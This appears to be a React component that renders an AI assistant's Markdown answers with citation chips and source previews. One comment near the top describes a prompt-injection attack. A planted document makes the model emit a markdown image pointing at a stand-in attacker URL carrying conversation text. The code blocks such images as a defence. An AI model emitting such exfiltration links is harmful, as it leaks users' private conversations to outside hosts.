import { clsx } from 'clsx'
import { FileText } from 'lucide-react'
import { memo, useState } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import type { Passage } from '../../lib/api'
import { CITATION_PREFIX, DOC_PREFIX, linkCitations } from '../../lib/citations'
import { truncate } from '../../lib/format'

interface MarkdownProps {
  content: string
  streaming?: boolean
  sources?: Passage[]
  onCite?: (n: number) => void
}

export const Markdown = memo(function Markdown({ content, streaming, sources, onCite }: MarkdownProps) {
  const components: Components = {
    // Never load images from model output: a prompt injection in a document could make the
    // model emit ![](https://attacker/?q=<conversation text>) and leak data when the browser fetches it.
    img({ alt }) {
      return alt ? <span className="text-muted">[{alt}]</span> : null
    },
    a({ href, children }) {
      if (href?.startsWith(CITATION_PREFIX)) {
        const n = Number(href.slice(CITATION_PREFIX.length))
        return <CitationChip n={n} passage={sources?.[n - 1]} onSelect={onCite} />
      }
      if (href?.startsWith(DOC_PREFIX)) {
        return (
          <span className="inline-flex items-center gap-1 rounded-md border border-mark bg-mark-soft px-1.5 py-px align-baseline text-[12px] font-medium text-mark-fg">
            <FileText className="size-3" />
            {children}
          </span>
        )
      }
      return (
        <a href={href} target="_blank" rel="noreferrer noopener">
          {children}
        </a>
      )
    },
  }

  return (
    <div className={clsx('prose-answer', streaming && 'is-streaming')}>
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {linkCitations(content)}
      </ReactMarkdown>
    </div>
  )
})

function CitationChip({ n, passage, onSelect }: { n: number; passage?: Passage; onSelect?: (n: number) => void }) {
  const [preview, setPreview] = useState(false)
  const available = Boolean(passage)
  return (
    <span className="relative inline-block" onMouseLeave={() => setPreview(false)}>
      <button
        type="button"
        data-citation
        disabled={!available}
        aria-label={available ? `Show source ${n}` : `Source ${n} is not available`}
        onClick={() => onSelect?.(n)}
        onMouseEnter={() => setPreview(true)}
        onFocus={() => setPreview(true)}
        onBlur={() => setPreview(false)}
        className={clsx(
          'relative -top-px mx-px inline-flex h-[18px] min-w-[18px] items-center justify-center rounded-[5px] px-1 align-middle text-[11px] font-semibold tabular-nums transition-colors',
          available
            ? 'border border-mark bg-mark-soft text-mark-fg hover:bg-mark'
            : 'border border-line bg-sunken text-subtle',
        )}
      >
        {n}
      </button>
      {preview && passage && (
        <span
          role="tooltip"
          className="pointer-events-none absolute bottom-full left-1/2 z-30 mb-2 block w-[min(18rem,75vw)] -translate-x-1/2 animate-fade-in rounded-xl border border-line bg-surface p-3 text-left shadow-pop"
        >
          <span className="flex items-center gap-1.5 text-[11px] font-medium text-subtle">
            <FileText className="size-3" />
            <span className="truncate">{passage.fileName ?? 'Document'}</span>
            {passage.pageNumber != null && <span className="shrink-0">· p. {passage.pageNumber}</span>}
          </span>
          <span className="mt-1.5 block font-serif text-[14px] leading-snug text-fg">
            {truncate(passage.text, 220)}
          </span>
        </span>
      )}
    </span>
  )
}
